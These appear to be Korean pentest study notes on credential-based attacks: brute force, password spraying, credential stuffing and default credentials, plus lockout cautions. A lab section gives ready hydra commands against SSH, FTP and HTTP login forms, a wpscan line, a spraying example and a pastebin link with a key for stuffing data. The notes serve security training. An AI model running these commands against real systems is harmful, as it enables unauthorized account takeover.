# 계정 정보 기반 공격

- 네트워크 서비스 혹은 운영체제에 존재하는 유저 계정 정보를 기반으로 하는 공격

**비밀번호 브루트포스 공격 (Password Bruteforce Attack)**
- 여러 번의 로그인을 통해 모든 조합의 비밀번호를 시도
- 사전 공격 (Dictionary Attack)**: 이미 존재하는 단어 사전을 이용한 브루트포스

**비밀번호 스프레이 공격 (Password Spraying Attack)**
- 여러 계정을 향해 자주 사용되는 비밀번호를 한 번씩 시도

**크레덴셜 스터핑 (Credential Stuffing)**
- 이전에 유출한 유저 이름 및 비밀번호를 다른 대상에 시도

**기본 계정 (Default Credentials/Passwords)**
- 프레임웤, 버전 등이 유출되어 기본적으로 존재하는 유저 이름과 비밀번호를 시도
	
## 계정 정보 기반 공격 - 주의점

- **계정 잠금 (Account Lockout):**  
  잘못된 로그인 시도 후 사용자 계정에 대한 접근을 일시적으로 차단하는 보안 제어

- **호스트 기반 블랙리스트 (Host Blacklist):**  
  공격자 호스트의 다양한 특성(IP, Geolocation, User Behavior 등)을 기반으로 접근을 차단함

- **비밀번호 정책 (Password Policy):**  
  비밀번호 길이, 계정 잠금 임계치, 계정 잠금 시간 등을 설정해놓은 정책을 사전에 고객사에 요청
  - BNPT & Active Directory BAPT

---

> 따라서, 실무에서는 무작위대입 공격보다는 스프레이 및 크레덴셜 스터핑 공격 지향

# 실습 - 계정 정보 기반 공격

## (준비)사용자 이름 사전
```bash
echo 'root\nchoi\nwordpress\nroot\neditor\nanonymous' > users.txt
```
## (준비)비밀번호 사전
```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
cat /usr/share/wordlists/rockyou.txt | head -50 > pass.txt
```
## SSH - 브루트포스
```bash
hydra -L users.txt -P pass.txt ssh://<ip> -V -s <port>
```
## FTP - 브루트포스
```bash
hydra -L users.txt -P pass.txt ftp://<ip> -V -s <port>
```

## HTTP 로그인 - 브루트포스
```bash
hydra -L users.txt -P pass.txt <ip> -s <port> http-post-form "/<endpoint>:username=^USER^&password=^PASS^:F=<error-message>" -V
```
- WordPress 환경이라면 아래로 가능
`wpscan --url <ip>:<port> --password pass.txt




## 비밀번호 스프레이

```bash
hydra -L users.txt -p 'Winter2023!' ssh://<ip> -V
```
- 사용자 이름 사전과, Winter2023! 으로 공격



## 크레덴셜 스터핑
```
https://pastebin.com/gqZZQqsh:v8PupCipje 의 정보들을 사용
```











